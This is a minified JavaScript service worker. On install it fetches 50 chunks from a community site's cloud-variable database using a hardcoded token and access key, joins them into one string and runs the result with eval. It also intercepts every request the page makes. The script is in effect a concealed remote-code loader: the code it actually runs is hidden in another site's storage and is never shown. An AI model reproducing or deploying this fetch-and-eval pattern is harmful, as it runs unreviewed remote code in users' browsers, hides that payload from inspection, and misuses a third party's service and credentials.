!function(){
  self._request=self._fetch=fetch,self.lib=null,self.log=null;
  caches.open('lib').then(c=>lib=c),caches.open('log').then(c=>log=c);
  self.onfetch=e=>e.respondWith(_request(e.request).catch(n=>
    Response.json({error:n&&n.stack||String(n),url:e.request.url},{status:502})
  )),self.oninstall=e=>e.waitUntil(done);
  var p=new URLSearchParams(location.search),o={
    b:''+1704e9,
    token:'JkH75nz534ET68YzNEHirc6b4sXHr6Z5',
    version:'1.1',
    accept:'application/json, text/plain, */*',
    'accept-language':'zh-CN,zh;q=0.9',
    'content-type':'application/json'
  },keys=Array(50).fill(p.get('id')).map((a,i)=>a+'-'+i)
  ,done=fetch('https://community-web-cloud-database.ccw.site/cloud_variable/list',{
    headers:new Headers([...Object.entries(o),...p]),
    method:'POST',mode:'cors',body:JSON.stringify({
      accessKey:'65bfa56c97d7397be35cbc09',primaryKey:'65bfa56c97d7397be35cbc09',
      secondaryKeys:keys,filterKeys:[]
    })
  }).then(r=>r.ok&&r.json()).then(o=>o&&keys.map(k=>o.body[k].v).join('')).then(eval);
}();
